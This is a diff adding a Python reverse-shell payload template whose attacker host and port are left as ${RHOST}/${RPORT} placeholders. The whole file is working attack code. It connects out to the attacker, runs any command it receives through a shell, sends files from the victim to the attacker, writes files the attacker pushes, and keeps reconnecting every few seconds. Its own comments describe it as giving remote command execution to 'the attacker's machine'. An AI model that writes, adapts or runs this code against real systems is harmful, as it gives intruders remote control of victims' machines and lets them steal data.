@@ -1,0 +1,118 @@
+#// - Establishes a reverse TCP connection to the specified IP and port, allows remote command execution from the attacker's machine.
+#// - The attacker can also upload and download files.
+
+import os
+import time
+import socket
+import threading
+import subprocess
+import logging
+
+RHOST = "${RHOST}"
+RPORT = "${RPORT}"
+
+logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
+
+class ReverseShell:
+    def __init__(self, rhost: str, rport: int) -> None:
+        self.rhost = rhost
+        self.rport = rport
+        self.connection = None
+
+    def create_connection(self) -> None:
+        try:
+            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.connection.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            logging.info(f"Socket created, attempting connection to {self.rhost}:{self.rport}...")
+        except Exception as e:
+            logging.error(f"Error while creating connection: {e}")
+
+    def execute_command(self, command: str) -> str:
+        output = ""
+        try:
+            command = command.strip()
+            if command.startswith("cd"):
+                output = self.change_directory(command)
+            elif command.startswith("download"):
+                output = self.download_file(command)
+            elif command.startswith("upload"):
+                output = self.upload_file(command)
+            else:
+                output = self.run_system_command(command)
+        except Exception as e:
+            output = f"Error: {e}"
+
+        return output
+
+    def change_directory(self, command: str) -> str:
+        path = command[3:].strip()
+        try:
+            if path:
+                os.chdir(path)
+                return f"Changed directory to: {os.getcwd()}\n"
+            else:
+                return "Usage: cd <directory>\n"
+        except Exception as e:
+            return f"Error: {str(e)}\n"
+
+    def download_file(self, command: str) -> str:
+        file_path = command[9:].strip()
+        try:
+            if os.path.exists(file_path):
+                with open(file_path, "rb") as file:
+                    self.connection.sendall(file.read())
+                return f"File {file_path} sent successfully.\n"
+            else:
+                return f"File not found: {file_path}\n"
+        except Exception as e:
+            return f"Error sending file: {str(e)}\n"
+
+    def upload_file(self, command: str) -> str:
+        file_name = command[7:].strip()
+        try:
+            with open(file_name, "wb") as file:
+                data = self.connection.recv(4096)
+                file.write(data)
+            return f"File {file_name} uploaded successfully.\n"
+        except Exception as e:
+            return f"Error uploading file: {str(e)}\n"
+
+    def run_system_command(self, command: str) -> str:
+        try:
+            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+            return output
+        except subprocess.CalledProcessError as e:
+            return f"Command failed: {str(e.output).strip()}\n"
+        except Exception as e:
+            return f"Error executing command: {str(e)}\n"
+
+    def connect_socket(self) -> None:
+        self.create_connection()
+
+        while True:
+            try:
+                self.connection.connect((self.rhost, self.rport))
+                logging.info(f"Connected to {self.rhost}:{self.rport}")
+
+                while True:
+                    self.connection.send(f"{os.uname().nodename} >> ".encode())
+                    data = self.connection.recv(2048).decode("UTF-8")
+                    if not data:
+                        raise ConnectionResetError("Connection closed by server.")
+                    logging.info(f"Received command: {data}")
+                    output = self.execute_command(data)
+                    self.connection.send(output.encode("UTF-8"))
+
+            except (ConnectionRefusedError, ConnectionResetError, BrokenPipeError) as e:
+                logging.warning(f"Connection lost: {e}. Retrying in 3 seconds...")
+                time.sleep(3)
+                self.create_connection()
+
+            except Exception as e:
+                logging.error(f"Unexpected error: {e}")
+                break
+
+if __name__ == "__main__":
+    t1 = threading.Thread(target=ReverseShell(rhost=RHOST, rport=int(RPORT)).connect_socket(), daemon=True)
+    t1.start()
+    t1.join()
